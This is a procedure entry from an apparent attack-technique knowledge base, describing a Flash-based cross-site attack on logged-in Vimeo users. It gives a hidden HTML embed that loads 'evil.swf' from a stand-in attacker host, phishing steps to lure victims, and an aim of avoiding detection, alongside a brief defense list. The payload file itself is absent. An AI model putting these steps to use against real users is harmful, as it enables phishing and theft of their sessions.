---
id: proc-vimeo-load-evil-swf-001
tags:
  - drive-by-compromise
  - flash
  - initial-access
type: procedure
tools:
  - '[[tools/evil-swf]]'
tactics:
  - '[[Initial Access]]'
verified: false
platforms:
  - Web
  - Flash
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:27:36.211Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Load-Malicious-HTML-with-Evil-SWF

## Summary

This procedure involves hosting and delivering a malicious HTML page that embeds a custom evil.swf file, tricking a logged-in Vimeo user into loading it to initiate the cross-site flashing attack. It relies on social engineering to achieve initial access.

## Description

In the context of the Vimeo CSRF vulnerability, the attacker creates an HTML page embedding evil.swf, hosted on an external domain like opnsec.com. When the victim, who is authenticated on Vimeo, opens the page (e.g., via a phishing link), the SWF loads in their browser. This requires Flash to be enabled and works best on Firefox for Windows. The procedure sets the stage for token theft by ensuring the malicious Flash content executes in the victim's session context.

## Requirements

1. Control of an external web server to host the HTML and SWF files
2. Victim logged into Vimeo with Flash enabled in browser
3. Social engineering vector (e.g., email link) to direct victim to the page

## Defense

Defensive measures and detection strategies:

- Disable Flash Player globally or via browser extensions
- Implement Content Security Policy (CSP) to block external Flash loads
- Educate users on phishing and suspicious links; monitor for anomalous Flash traffic

## Objectives

1. Deliver the evil.swf payload to the victim's browser
2. Ensure execution within the authenticated Vimeo session
3. Avoid detection by blending with legitimate content

## Instructions

### Step 1: Host Malicious HTML Page

**Context**: Create and deploy the HTML file that embeds evil.swf to load the Flash content seamlessly.

Embed the SWF using HTML tags:

```html
<object data="http://evilsite.com/evil.swf" type="application/x-shockwave-flash" width="1" height="1"></object>
```

> This minimal embed hides the Flash object. Host at a URL like http://opnsec.com/vimeo/VimeoMoogaloop.html.

### Step 2: Trick Victim into Loading the Page

**Context**: Use phishing or other lures to get the victim to visit the hosted page while logged into Vimeo.

Send a link via email or social media pointing to the HTML page.

> Expected: Victim opens link; evil.swf loads if Flash is active. Verify by checking browser developer tools for Flash initialization.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Drive-by Compromise]] Drive-by Compromise

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/evil-swf]]

## Tags

- drive-by-compromise
- flash
- phishing
